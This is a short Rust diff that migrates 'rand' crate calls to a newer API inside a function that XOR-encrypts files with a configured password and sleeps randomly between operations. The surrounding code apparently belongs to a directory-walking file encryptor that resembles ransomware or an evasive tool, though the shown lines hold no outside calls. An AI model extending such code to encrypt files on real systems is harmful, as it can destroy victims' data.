@@ -6,7 +6,7 @@ use std::io::{self, Read, Write};
 use std::thread;
 use std::time::Duration;
 use walkdir::WalkDir;
-use rand::Rng;
+use rand::RngExt;
 
 use crate::config;
 use crate::crypto;
@@ -84,7 +84,7 @@ fn process_file(file_path: &std::path::Path) -> io::Result<()> {
     crypto::xor_cipher(&mut data, config::PASSWORD.as_bytes());
 
     // Random sleep between 1-5 seconds
-    let sleep_duration = rand::thread_rng().gen_range(1..=5);
+    let sleep_duration = rand::rng().random_range(1..=5);
     thread::sleep(Duration::from_secs(sleep_duration));
 
     if config::SHOW_CLI {
